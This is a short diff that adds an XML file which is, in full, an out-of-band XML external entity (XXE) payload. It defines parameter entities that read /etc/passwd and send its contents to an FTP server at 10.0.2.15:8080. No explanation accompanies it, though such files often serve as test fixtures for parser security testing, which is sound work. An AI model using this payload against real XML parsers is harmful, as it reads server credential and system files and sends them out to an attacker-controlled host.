@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+<!ENTITY % p2 "<!ENTITY % p3 SYSTEM \"ftp://10.0.2.15:8080/%p1;\">">
+%p2;
+%p3;
+]>
+<foo></foo>
